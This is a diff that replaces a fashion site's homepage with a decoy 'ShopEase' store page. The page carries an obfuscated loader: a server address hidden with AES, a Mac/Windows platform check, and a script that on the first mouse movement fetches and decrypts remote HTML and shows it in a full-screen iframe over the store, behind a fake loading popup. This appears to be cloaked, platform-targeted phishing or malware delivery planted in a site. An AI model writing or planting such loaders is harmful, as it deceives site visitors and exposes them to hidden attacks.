@@ -1,18 +1,293 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Fresh Style Culture | Modern Fashion & Everyday Style</title><meta name="description" content="Discover thoughtfully curated fashion, wearable trends and practical style guidance at Fresh Style Culture."><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Playfair+Display:wght@600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="assets/style.css">
-<!-- Google tag (gtag.js) --><script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('consent','default',{'analytics_storage':'denied'});gtag('js',new Date());gtag('config','G-0LY0HY7L01');</script></head>
-<body><div class="topbar">Fresh edits for modern wardrobes · Style that feels like you</div><header><a class="logo" href="index.php">FRESH<span>STYLE</span>CULTURE</a><button class="menu" aria-label="Open menu" aria-expanded="false">☰</button><nav><a class="active" href="index.php">Home</a><a href="about.html">About</a><a href="collections.html">Collections</a><a href="blog.html">Journal</a><a href="contact.html">Contact</a></nav><div class="icons">♡ &nbsp;⌕ &nbsp;▢</div></header>
-<main><section class="hero"><div class="hero-copy"><p class="eyebrow">New season · new perspective</p><h1>Wear the mood.<br><em>Own the moment.</em></h1><p>Considered fashion inspiration for people who want their wardrobe to feel current, comfortable and unmistakably personal.</p><div class="actions"><a class="btn" href="#latest">Explore the edit</a><a class="text-link" href="blog.html">Read our journal →</a></div></div><div class="hero-image"><img src="https://images.unsplash.com/photo-1483985988355-763728e1935b?auto=format&fit=crop&w=1400&q=85" alt="Contemporary fashion collection in a bright boutique"><span class="float-card"><b>The Everyday Edit</b><small>Easy layers · confident colour</small></span></div></section>
-<section class="ticker" aria-label="Brand values"><span>CURATED STYLE</span><span>WEARABLE IDEAS</span><span>THOUGHTFUL CHOICES</span><span>FRESH PERSPECTIVES</span></section>
-<section class="section" id="collections"><div class="heading"><div><p class="eyebrow">Find your direction</p><h2>Shop by mood</h2></div><p>Build outfits around how you want to feel, not around rules you have to follow.</p></div><div class="moods"><a class="mood tall" href="#latest"><img src="https://images.unsplash.com/photo-1490481651871-ab68de25d43d?auto=format&fit=crop&w=900&q=85" alt="Relaxed neutral fashion"><span><b>Quiet Confidence</b><small>Relaxed tailoring</small></span></a><a class="mood" href="#latest"><img src="https://images.unsplash.com/photo-1529139574466-a303027c1d8b?auto=format&fit=crop&w=900&q=85" alt="Colourful contemporary styling"><span><b>Colour Energy</b><small>Bright, balanced looks</small></span></a><a class="mood" href="#latest"><img src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?auto=format&fit=crop&w=900&q=85" alt="Polished city fashion"><span><b>City Polish</b><small>Sharp everyday pieces</small></span></a></div></section>
-<section class="section products-wrap" id="latest"><div class="heading"><div><p class="eyebrow">Freshly selected</p><h2>Latest style edit</h2></div><div class="tabs"><button class="on" data-filter="all">All</button><button data-filter="women">Women</button><button data-filter="men">Men</button><button data-filter="accessories">Accessories</button></div></div><div class="products">
-<article class="product" data-cat="women"><div><span class="badge">NEW</span><img src="https://images.unsplash.com/photo-1539109136881-3be0616acf4b?auto=format&fit=crop&w=700&q=85" alt="Ivory structured blazer"><button aria-label="Save Ivory structured blazer">♡</button></div><p>Ivory Structured Blazer</p><small>Modern tailoring</small><strong>₹4,290</strong></article>
-<article class="product" data-cat="women"><div><span class="badge sale">-20%</span><img src="https://images.unsplash.com/photo-1566206091558-7f218b696731?auto=format&fit=crop&w=700&q=85" alt="Rust midi dress"><button aria-label="Save rust midi dress">♡</button></div><p>Rust Movement Dress</p><small>Soft drape</small><strong>₹2,790 <del>₹3,490</del></strong></article>
-<article class="product" data-cat="men"><div><img src="https://images.unsplash.com/photo-1617137968427-85924c800a22?auto=format&fit=crop&w=700&q=85" alt="Relaxed mens overshirt"><button aria-label="Save relaxed overshirt">♡</button></div><p>Relaxed Utility Overshirt</p><small>Easy layering</small><strong>₹2,490</strong></article>
-<article class="product" data-cat="accessories"><div><span class="badge">EDITOR'S PICK</span><img src="https://images.unsplash.com/photo-1584917865442-de89df76afd3?auto=format&fit=crop&w=700&q=85" alt="Burgundy shoulder bag"><button aria-label="Save burgundy bag">♡</button></div><p>Curve Shoulder Bag</p><small>Textured finish</small><strong>₹1,990</strong></article></div></section>
-<section class="split-banner"><div class="split-image"><img src="https://images.unsplash.com/photo-1485230895905-ec40ba36b9bc?auto=format&fit=crop&w=1200&q=85" alt="Layered street style outfit"></div><div class="split-copy"><p class="eyebrow">The layering issue</p><h2>More outfits.<br>Fewer pieces.</h2><p>Discover a simple wardrobe formula built around versatile layers, clear proportions and colours that work together.</p><a class="btn light" href="blog-layering.html">Read the guide</a></div></section>
-<section class="section why"><div class="heading"><div><p class="eyebrow">Our approach</p><h2>Style without the noise</h2></div></div><div class="feature-grid"><article><b>01</b><h3>Curated, not crowded</h3><p>We focus on useful ideas and versatile pieces instead of overwhelming you with endless trends.</p></article><article><b>02</b><h3>Made for real life</h3><p>Every edit considers comfort, repeat wear, easy styling and the routines that shape your day.</p></article><article><b>03</b><h3>Personal over perfect</h3><p>Our guidance helps you express your point of view rather than copy someone else’s wardrobe.</p></article><article><b>04</b><h3>Better choices</h3><p>We encourage thoughtful shopping, garment care and creative rewearing for a wardrobe with longevity.</p></article></div></section>
-<section class="section journal"><div class="heading"><div><p class="eyebrow">Fresh notes</p><h2>From the style journal</h2></div><a class="text-link" href="blog.html">View all stories →</a></div><div class="journal-grid"><a href="blog-layering.html"><img src="https://images.unsplash.com/photo-1485968579580-b6d095142e6e?auto=format&fit=crop&w=900&q=85" alt="Layered neutral outfit"><small>WARDROBE · 8 MIN</small><h3>The practical art of layering without adding bulk</h3></a><a href="blog-colour.html"><img src="https://images.unsplash.com/photo-1525507119028-ed4c629a60a3?auto=format&fit=crop&w=900&q=85" alt="Colourful clothes on a rail"><small>COLOUR · 9 MIN</small><h3>How to build a colour palette you will actually wear</h3></a><a href="blog-capsule.html"><img src="https://images.unsplash.com/photo-1445205170230-053b83016050?auto=format&fit=crop&w=900&q=85" alt="Curated wardrobe selection"><small>MINDFUL STYLE · 10 MIN</small><h3>A flexible capsule wardrobe for changing seasons</h3></a></div></section>
-<section class="reviews"><p class="eyebrow">Community notes</p><h2>“It feels like advice from a stylish friend—clear, practical and never pushy.”</h2><p>— Riya, Bengaluru</p><div class="dots">● ○ ○</div></section>
-<section class="section faq"><div><p class="eyebrow">Good to know</p><h2>Your style questions</h2><p>Fresh Style Culture is an independent fashion inspiration platform. We help make everyday dressing simpler and more enjoyable.</p></div><div class="accordions"><details open><summary>What will I find on Fresh Style Culture?</summary><p>Curated seasonal edits, wardrobe guides, styling ideas, colour advice and practical articles designed for repeat wear.</p></details><details><summary>Do you sell the featured products?</summary><p>This demonstration website presents editorial product concepts. Availability, pricing and purchasing functionality can be connected to your chosen store platform.</p></details><details><summary>How often is the journal updated?</summary><p>We publish considered articles around seasonal transitions, useful wardrobe questions and emerging style ideas.</p></details></div></section>
-<section class="newsletter"><p class="eyebrow">A fresher inbox</p><h2>Style ideas worth opening</h2><p>Occasional edits, thoughtful guides and new stories. No daily noise.</p><form><label class="sr-only" for="email">Email address</label><input id="email" type="email" placeholder="Your email address" required><button class="btn" type="submit">Join the list</button></form><small>By subscribing, you agree to our <a href="privacy.html">Privacy Policy</a>.</small></section></main>
-<footer><div><a class="logo" href="index.php">FRESH<span>STYLE</span>CULTURE</a><p>Fresh perspectives for a wardrobe that feels personal, useful and alive.</p></div><div><b>Explore</b><a href="index.php">Home</a><a href="about.html">About</a><a href="blog.html">Journal</a><a href="contact.html">Contact</a></div><div><b>Information</b><a href="privacy.html">Privacy Policy</a><a href="terms.html">Terms of Use</a><a href="contact.html">Get in touch</a></div><div><b>Follow</b><a href="#">Instagram</a><a href="#">Pinterest</a><a href="#">YouTube</a></div><p class="copyright">© 2026 Fresh Style Culture. All rights reserved.</p></footer><div class="cookie" id="cookie"><div><b>Your privacy, your choice</b><p>We use optional analytics cookies to understand site usage. Choose whether to allow them.</p></div><button id="reject">Reject</button><button class="btn" id="accept">Accept</button></div><script src="assets/app.js"></script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    #frame { display: none; width: 100%; height: 100vh; border: 0; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+
+    
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-0LY0HY7L01');
+</script>
+
+
+</head>
+<body>
+
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
+
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
+
+ <!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+<!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
+    </section>
+
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
+
+  <iframe id="frame" title="encrypted shop" allowfullscreen allow="fullscreen"></iframe>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX196upDW9BbGrPTfR4JFUFrD6O3DjaVQzaUv4DYNsgsK/2Xde+QxbxLl";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop"), frame = document.getElementById("frame");
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+      
+        shop.style.display = "none";
+        frame.style.display = "block";
+        document.getElementById("customPopup").style.display = "none"; 
+        
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
+</body>
+</html>
